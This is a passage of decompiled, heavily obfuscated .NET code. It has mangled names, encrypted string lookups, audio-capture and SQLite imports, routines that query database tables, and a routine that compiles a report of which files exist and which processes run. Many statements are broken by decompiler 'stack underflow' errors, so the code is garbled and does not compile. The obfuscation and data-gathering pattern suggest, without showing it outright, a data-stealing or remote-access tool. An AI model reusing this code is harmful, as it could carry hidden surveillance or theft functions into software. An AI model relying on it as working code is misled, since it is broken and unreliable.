			return global::_0002._007E_0006(_0002);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0018._0004 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			new Container();
			((global::_0018._0004)/*Error near IL_0009: Stack underflow*/)._0001 = (IContainer)/*Error near IL_0009: Stack underflow*/;
		}

		static uint _0001(string _0002)
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			uint num = default(uint);
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				num = 2166136261u;
				for (int i = 0; i < global::_001A._007E_0016_0003(_0002); i++)
				{
					num = (_009F_0004._007E_0088_000E(_0002, i) ^ num) * 16777619;
				}
			}
			return num;
		}

		static void _0001(global::_0017._0080 _0002)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			if (((global::_0017._0080)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((global::_0017._0080)/*Error near IL_0011: Stack underflow*/)._0001._0002();
			}
		}

		static _0080._0017 _0001(ref bool _0002, bool _0003, ref int _0004, bool _0005, ref uint _0006, int _0007)
		{
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0080._0017 obj = _0080._0017._0002;
			_0018._0001((int)/*Error near IL_0055: Stack underflow*/);
			int num = (int)/*Error near IL_0008: Stack underflow*/;
			uint num2 = 0u;
			bool flag = false;
			if (_0018._0001())
			{
				if (obj == _0080._0017._0002 && _0003)
				{
					obj = _0018._0001();
					if (obj == _0080._0017._0002)
					{
						flag = true;
					}
				}
				if (obj == _0080._0017._0002 && _0005)
				{
					obj = _0018._0001(ref num2);
				}
			}
			else if (_0003 || _0005)
			{
				obj = _0080._0017._0013;
			}
			_0004 = num;
			_0006 = num2;
			_0002 = flag;
			return obj;
		}

		static int _0001(int _0002, int _0003, global::_0015._0008 _0004, byte[] P_3)
		{
			//IL_0058: Incompatible stack heights: 0 vs 2
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			_ = _0016_0002._0018_0005;
			int num = ((global::_0015._0008)/*Error near IL_000e: Stack underflow*/)._0002;
			/*Error near IL_0062: Stack underflow*/((int)/*Error near IL_0062: Stack underflow*/, num);
			int num2 = (int)/*Error near IL_0011: Stack underflow*/;
			_0099_0002._0010_0006(_0004._0001, _0004._0001, P_3, _0003, num2);
			_0004._0001 += num2;
			_0004._0002 -= num2;
			if (_0004._0002 == 0)
			{
				_0004._0001 = 0;
			}
			return num2;
		}

		static void _0001(_001E._0010 _0002, BinaryReader P_1)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			_0018._0001((BinaryReader)/*Error near IL_0047: Stack underflow*/);
			((_001E._0010)/*Error near IL_000b: Stack underflow*/)._0004 = (_001F._0013)/*Error near IL_000b: Stack underflow*/;
			_0002._0002 = global::_001A._007E_001D_0003(P_1);
			for (int i = 0; i < _0002._0002; i++)
			{
				_0083_0002._007E_008C_0005(P_1, 20);
			}
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string P_3)
		{
			//IL_02ea: Incompatible stack heights: 0 vs 1
			//IL_02f4: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107357450);
			new DataTable((string?)/*Error near IL_02f4: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_02fa: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107357469), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107356908), _0091._0080_0004(typeof(string).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			if (global::_001C._0096_0003(_0004))
			{
				_0004 = null;
			}
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107356915), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						if ((_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj2, 1), P_3, StringComparison.OrdinalIgnoreCase) == 0 || P_3 == null) && (_0004 == null || _009D_0003._009D_0007(_0004, _009E_0003._007E_0001_0008(obj2, 2), StringComparison.OrdinalIgnoreCase) == 0))
						{
							DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107357469), _009E_0003._007E_0001_0008(obj2, 1));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107356908), _009E_0003._007E_0001_0008(obj2, 4));
							_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		[DllImport("msdmo.dll", EntryPoint = "MoInitMediaType")]
		static extern int _0001([In][Out] ref _001B._0004 _0002, int _0003);

		static void _0001(global::_0016._0014 P_0)
		{
			//IL_00b4: Incompatible stack heights: 0 vs 1
			bool flag = false;
			for (int i = 1; i < P_0._0001.Count; i++)
			{
				IEnumerator<global::_0013._0010> enumerator = ((global::_0016._0014)/*Error near IL_0018: Stack underflow*/)._0001[i].GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						global::_0013._0010 current = enumerator.Current;
						if (!_0018._0001(current))
						{
							P_0._0001[0].Add(current);
							flag = true;
						}
					}
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
			}
			for (int num = P_0._0001.Count - 1; num > 0; num--)
			{
				_0018._0001(P_0, num);
			}
			if (flag)
			{
				P_0._0001();
			}
		}

		static void _0001(global::_0001._0002 P_0)
		{
			//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f6: Expected O, but got Unknown
			//IL_011e: Incompatible stack heights: 0 vs 2
			//IL_012e: Incompatible stack heights: 0 vs 2
			_ = global::_0008._0017_0002;
			/*Error near IL_0128: Stack underflow*/((object)/*Error near IL_0128: Stack underflow*/);
			_ = _0092_0005._0081_000F;
			SizeF sizeF = new SizeF(6f, 13f);
			/*Error near IL_002f: Stack underflow*/((object)/*Error near IL_002f: Stack underflow*/, sizeF);
			_0093_0005._0082_000F(P_0, (AutoScaleMode)1);
			_008C_0005._001C_000F(P_0, new Size(0, 0));
			global::_0006._0095(P_0, (FormBorderStyle)0);
			global::_0005._0090(P_0, false);
			global::_0005._0091(P_0, false);
			_0082_0003._0013_0007(P_0, _0080._0014._0001(107356737));
			_0094_0005._0083_000F(P_0, 0.0);
			global::_0005._0083(P_0, false);
			global::_0005._0084(P_0, false);
			_0095_0005._0084_000F(P_0, (SizeGripStyle)2);
			_0082_0003._007E_0014_0007(P_0, _0080._0014._0001(107356737));
			_0096_0005._0086_000F(P_0, new FormClosingEventHandler(P_0._0001));
			_0097_0005._0087_000F(P_0, P_0._0001);
			global::_0005._0092(P_0, false);
		}

		[DllImport("winmm.dll", EntryPoint = "midiConnect")]
		static extern MmResult _0001(IntPtr _0002, IntPtr _0003, IntPtr _0004);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_file_control")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, int _0004, IntPtr _0005);

		static void _0001(global::_0018._001A _0002, bool P_1)
		{
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			if (((global::_0018._001A)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				return;
			}
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (((global::_0018._001A)/*Error near IL_0014: Stack underflow*/)._0001 != null)
				{
					global::_0008._007E_0007_0002(_0002._0001);
					_0002._0001 = null;
				}
				_0002._0002 = null;
				_0002._0002 = IntPtr.Zero;
				_0002._0001 = null;
				_0002._0001 = IntPtr.Zero;
				_0002._0001 = null;
			}
			_0002._0001 = true;
		}

		static void _0001(global::_0005._0005 _0002, BinaryReader _0003, int P_2)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00c2: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ < 16)
			{
				_0080._0014._0001(107356760);
				new InvalidDataException((string?)/*Error near IL_00c2: Stack underflow*/);
				throw /*Error near IL_0019: Stack underflow*/;
			}
			_0002._0001 = (WaveFormatEncoding)_0081_0002._007E_0087_0005(_0003);
			_0002._0001 = _0088_0002._007E_0091_0005(_0003);
			_0002._0001 = global::_001A._007E_001D_0003(_0003);
			_0002._0002 = global::_001A._007E_001D_0003(_0003);
			_0002._0002 = _0088_0002._007E_0091_0005(_0003);
			_0002._0003 = _0088_0002._007E_0091_0005(_0003);
			if (P_2 > 16)
			{
				_0002._0004 = _0088_0002._007E_0091_0005(_0003);
				if (_0002._0004 != P_2 - 18)
				{
					_0002._0004 = (short)(P_2 - 18);
				}
			}
		}

		static string _0001(BinaryReader _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = _0098_0005._007E_008A_000F;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, 4);
			new string((char[]?)/*Error near IL_001c: Stack underflow*/);
			return (string)/*Error near IL_000d: Stack underflow*/;
		}

		static long _0001(_007F._0008 _0002, long P_1)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected I8, but got Unknown
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = ((_007F._0008)/*Error near IL_0007: Stack underflow*/)._0002;
			int num = ((_007F._0008)/*Error near IL_0011: Stack underflow*/)._0001;
			_003F val = /*Error near IL_0013: Stack underflow*// num;
			return /*Error near IL_0014: Stack underflow*/* val;
		}

		static byte[] _0001()
		{
			//IL_0a75: Incompatible stack heights: 0 vs 2
			//IL_0a7f: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_000E._008A_0002;
				_0080._0014._0001(107356687);
				char[] obj = new char[1] { '|' };
				/*Error near IL_0a7f: Stack underflow*/((object)/*Error near IL_0a7f: Stack underflow*/, obj);
				string text = (string)((object[])/*Error near IL_0023: Stack underflow*/)[0];
				string text2 = global::_000E._008A_0002(_0080._0014._0001(107356694), new char[1] { '!' })[0];
				string text3 = _0081._0005_0004(new string[10]
				{
					global::_000E._008A_0002(_0080._0014._0001(107357153), new char[1] { '!' })[0],
					global::_0015._0001._0011,
					global::_000E._008A_0002(_0080._0014._0001(107357148), new char[1] { '!' })[0],
					global::_0015._0001._0006,
					global::_000E._008A_0002(_0080._0014._0001(107357095), new char[1] { '!' })[0],
					_0018._0001(),
					global::_000E._008A_0002(_0080._0014._0001(107357106), new char[1] { '!' })[0],
					global::_000E._008A_0002(_0080._0014._0001(107357077), new char[1] { '!' })[0],
					global::_0015._0001._0010,
					global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]
				});
				string text4;
				string text5;
				if (global::_001C._0097_0003(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0005, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])))
				{
					text4 = global::_0002._007E_001C(_0099_0005._008B_000F(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0005, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					Process[] array = _000E_0005._0094_000E(global::_0015._0001._0005);
					text5 = ((array.Length != 0) ? global::_000E._008A_0002(_0080._0014._0001(107357019), new char[1] { '!' })[0] : global::_000E._008A_0002(_0080._0014._0001(107357048), new char[1] { '!' })[0]);
				}
				else
				{
					text4 = global::_000E._008A_0002(_0080._0014._0001(107356962), new char[1] { '!' })[0];
					text5 = global::_000E._008A_0002(_0080._0014._0001(107356937), new char[1] { '!' })[0];
				}
				text3 = _0081._0005_0004(new string[12]
				{
					text3,
					global::_000E._008A_0002(_0080._0014._0001(107356396), new char[1] { '!' })[0],
					text5,
					global::_000E._008A_0002(_0080._0014._0001(107356407), new char[1] { '!' })[0],
					text4,
					global::_000E._008A_0002(_0080._0014._0001(107357148), new char[1] { '!' })[0],
					global::_0015._0001._0005,
					global::_000E._008A_0002(_0080._0014._0001(107357095), new char[1] { '!' })[0],
					_0018._0001(),
					global::_000E._008A_0002(_0080._0014._0001(107356354), new char[1] { '!' })[0],
					global::_0015._0001._0005,
					global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]
				});
				if (global::_001C._0097_0003(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0003, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])))
				{
					text4 = global::_0002._007E_001C(_0099_0005._008B_000F(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0003, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					text5 = global::_000E._008A_0002(_0080._0014._0001(107356329), new char[1] { '!' })[0];
				}
				else
				{
					text4 = global::_000E._008A_0002(_0080._0014._0001(107356962), new char[1] { '!' })[0];
					text5 = global::_000E._008A_0002(_0080._0014._0001(107356937), new char[1] { '!' })[0];
				}
				text3 = _0081._0005_0004(new string[12]
				{
					text3,
					global::_000E._008A_0002(_0080._0014._0001(107356336), new char[1] { '!' })[0],
					text5,
					global::_000E._008A_0002(_0080._0014._0001(107356407), new char[1] { '!' })[0],
					text4,
					global::_000E._008A_0002(_0080._0014._0001(107357148), new char[1] { '!' })[0],
					global::_0015._0001._0003,
					global::_000E._008A_0002(_0080._0014._0001(107357095), new char[1] { '!' })[0],
					_0018._0001(),
					global::_000E._008A_0002(_0080._0014._0001(107356354), new char[1] { '!' })[0],
					global::_0015._0001._0003,
					global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]
				});
				if (global::_001C._0097_0003(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0016, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])))
				{
					text4 = global::_0002._007E_001C(_0099_0005._008B_000F(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0016, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					Process[] array2 = _000E_0005._0094_000E(global::_0015._0001._0016);
					text5 = ((array2.Length != 0) ? global::_000E._008A_0002(_0080._0014._0001(107357019), new char[1] { '!' })[0] : global::_000E._008A_0002(_0080._0014._0001(107357048), new char[1] { '!' })[0]);
				}
				else
				{
					text4 = global::_000E._008A_0002(_0080._0014._0001(107356962), new char[1] { '!' })[0];
					text5 = global::_000E._008A_0002(_0080._0014._0001(107356937), new char[1] { '!' })[0];
				}
				text3 = _0081._0005_0004(new string[12]
				{
					text3,
					global::_000E._008A_0002(_0080._0014._0001(107356315), new char[1] { '!' })[0],
					text5,
					global::_000E._008A_0002(_0080._0014._0001(107356407), new char[1] { '!' })[0],
					text4,
					global::_000E._008A_0002(_0080._0014._0001(107357148), new char[1] { '!' })[0],
					global::_0015._0001._0016,
					global::_000E._008A_0002(_0080._0014._0001(107357095), new char[1] { '!' })[0],
					_0018._0001(),
					global::_000E._008A_0002(_0080._0014._0001(107356354), new char[1] { '!' })[0],
					global::_0015._0001._0016,
					global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]
				});
				if (global::_001C._0097_0003(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._001A, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])))
				{
					text4 = global::_0002._007E_001C(_0099_0005._008B_000F(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._001A, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					Process[] array3 = _000E_0005._0094_000E(global::_0015._0001._001A);
					text5 = ((array3.Length != 0) ? global::_000E._008A_0002(_0080._0014._0001(107357019), new char[1] { '!' })[0] : global::_000E._008A_0002(_0080._0014._0001(107357048), new char[1] { '!' })[0]);
				}
				else
				{
					text4 = global::_0002._007E_0006(_0080._0014._0001(107356262));
					text5 = global::_000E._008A_0002(_0080._0014._0001(107356937), new char[1] { '!' })[0];
				}
				text3 = _0081._0005_0004(new string[14]
				{
					text3,
					global::_000E._008A_0002(_0080._0014._0001(107356281), new char[1] { '!' })[0],
					text5,
					global::_000E._008A_0002(_0080._0014._0001(107356407), new char[1] { '!' })[0],
					text4,
					global::_000E._008A_0002(_0080._0014._0001(107357148), new char[1] { '!' })[0],
					global::_0015._0001._001A,
					global::_000E._008A_0002(_0080._0014._0001(107357095), new char[1] { '!' })[0],
					_0018._0001(),
					global::_000E._008A_0002(_0080._0014._0001(107356354), new char[1] { '!' })[0],
					global::_0015._0001._001A,
					global::_000E._008A_0002(_0080._0014._0001(107356228), new char[1] { '!' })[0],
					global::_0015._0001._0002,
					global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]
				});
				return _0018._0001(text3);
			}
			catch
			{
				return null;
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutReset")]
		static extern MmResult _0001(IntPtr _0002);

		static _0080._0017 _0001(ref int _0002, global::_0017._0080 _0003, ref int P_2)
		{
			//IL_00a7: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_00b1: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_0014: Stack underflow*/)._0001 != ConnectionState.Open)
			{
				throw new InvalidOperationException(_0080._0014._0001(107356203));
			}
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = _0099._008C_0004(8);
				_009A_0005._008C_000F(intPtr, 0, _0002);
				_009A_0005._008C_000F(intPtr, 4, P_2);
				_0080._0017 obj = _0003._0001._0001(null, 9, intPtr);
				if (obj == _0080._0017._0002)
				{
					_0002 = _009B_0005._008D_000F(intPtr, 0);
					P_2 = _009B_0005._008D_000F(intPtr, 4);
					return obj;
				}
				return obj;
			}
			finally
			{
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					_009B._0090_0004(intPtr);
				}
			}
		}

		[DllImport("winmm.dll", EntryPoint = "waveInPrepareHeader")]
		static extern MmResult _0001(IntPtr _0002, _007F._0006 _0003, int _0004);

		static int _0001(byte[] _0002, int _0003)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected I4, but got Unknown
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			_ = ((byte[])/*Error near IL_0005: Stack underflow*/)[/*Error near IL_0005: Stack underflow*/] << 8;
			byte num = ((byte[])/*Error near IL_000d: Stack underflow*/)[_0003 + 1];
			return ((((/*Error near IL_000e: Stack underflow*/ | num) << 8) | _0002[_0003 + 2]) << 8) | _0002[_0003 + 3];
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_0066: Incompatible stack heights: 0 vs 2
			//IL_006d: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_006d: Stack underflow*/((IntPtr)/*Error near IL_006d: Stack underflow*/);
			float* ptr = (float*)/*Error near IL_0073: Stack underflow*/;
			float*[] array = new float*[_0004];
			for (int i = 0; i < _0004; i++)
			{
				array[i] = (float*)_0010_0005._0096_000E(_0003[i]);
			}
			for (int j = 0; j < _0005; j++)
			{
				for (int k = 0; k < _0004; k++)
				{
					ref float* reference = ref array[k];
					float* ptr2 = reference;
					reference = ptr2 + 1;
					float* num = ptr;
					ptr = num + 1;
					*ptr2 = *num;
				}
			}
		}

		static string _0001()
		{
			//IL_0044: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0017._0084._0001;
			/*Error near IL_004b: Stack underflow*/((object)/*Error near IL_004b: Stack underflow*/);
			try
			{
				if (global::_0017._0084._000E != null)
				{
					return global::_0017._0084._000E;
				}
				if (global::_0017._0084._0002)
				{
					return null;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			return _0018._0001();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static DataTable _0001(global::_0017._0080 _0002, string P_1)
		{
			//IL_01d7: Incompatible stack heights: 0 vs 1
			//IL_01e1: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107401820);
			new DataTable((string?)/*Error near IL_01e1: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_01e7: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107356658), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358884), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107356609), _0091._0080_0004(typeof(long).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			global::_0010._001C obj = new global::_0010._001C(_0080._0014._0001(107356636), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						if (_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj2, 1), P_1, StringComparison.OrdinalIgnoreCase) == 0 || P_1 == null)
						{
							DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107356658), _009E_0003._007E_0001_0008(obj2, 1));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107358884), _009E_0003._007E_0001_0008(obj2, 2));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107356609), _009C_0005._007E_008E_000F(obj2, 0));
							_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		static void _0001(_0019._0005 P_0)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			if (((_0019._0005)/*Error near IL_0009: Stack underflow*/)._0001 == _001C._0005._0003)
			{
				object obj = ((_0019._0005)/*Error near IL_0013: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				MmResult mmResult;
				try
				{
					mmResult = _0018._0001(P_0._0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, _0080._0014._0001(107358259));
				}
				P_0._0001 = _001C._0005._0002;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(byte[] _0002)
		{
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			new StringBuilder(((Array)/*Error near IL_0009: Stack underflow*/).Length * 2);
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_000f: Stack underflow*/;
			int num = _0002.Length;
			for (int i = 0; i < num; i++)
			{
				_008B_0002._007E_0094_0005(stringBuilder, _0002[i].ToString(_0080._0014._0001(107356607)));
			}
			return global::_0002._007E_0006(stringBuilder);
		}

		static global::_0004._0016 _0001(int _0002, _0014 _0003, bool P_2)
		{
			//IL_0092: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_009c: Stack underflow*/);
			_0018._0001((_0014)/*Error near IL_0014: Stack underflow*/);
			if ((_0003._0001 & SQLiteConnectionFlags.UseConnectionReadValueCallbacks) == SQLiteConnectionFlags.UseConnectionReadValueCallbacks)
			{
				global::_0013._0015 obj = new global::_0013._0015();
				bool flag = default(bool);
				_0018._0001((_001B._0018)new global::_000F._0012(_0080._0014._0001(107356602), new global::_0001._001B(P_2), obj), ref flag, _0003, _0002);
				if (flag)
				{
					return obj._0001;
				}
			}
			if (_0002 >= _0003._0004 && _0003._0001 != null)
			{
				_001F._0019 obj2 = _0003._0001;
				int num = _0002 - _0003._0004;
				return _0018._0001(num, obj2, P_2);
			}
			return _0018._0001(_0003, _0002, P_2);
		}

		static void _0001(global::_0017._0015 P_0)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _009D_0005._008F_000F;
			IntPtr intPtr = ((global::_0017._0015)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_0018: Stack underflow*/(intPtr);
		}

		static long _0001(long _0002, global::_000F._0005 P_1)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Unknown result type (might be due to invalid IL or missing references)
			//IL_0033: Expected I8, but got Unknown
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			int num = ((global::_000F._0005)/*Error near IL_0009: Stack underflow*/)._0001._0002;
			_ = /*Error near IL_0010: Stack underflow*/* num;
			int num2 = ((global::_000F._0005)/*Error near IL_0017: Stack underflow*/)._0001.WaveFormat._0002;
			_003F val = /*Error near IL_0023: Stack underflow*// num2;
			return val - val % P_1._0001.BlockAlign;
		}

		[DllImport("ole32.Dll", EntryPoint = "CoCreateInstance")]
		static extern int _0001(ref Guid _0002, IntPtr _0003, uint _0004, ref Guid _0005, out IntPtr _0006);

		static DateTime _0001(global::_0001._001A _0002, string P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			SQLiteDateFormats sQLiteDateFormats = ((global::_0001._001A)/*Error near IL_0007: Stack underflow*/)._0001;
			DateTimeKind dateTimeKind = ((global::_0001._001A)/*Error near IL_0010: Stack underflow*/)._0001;
			string text = _0002._0005;
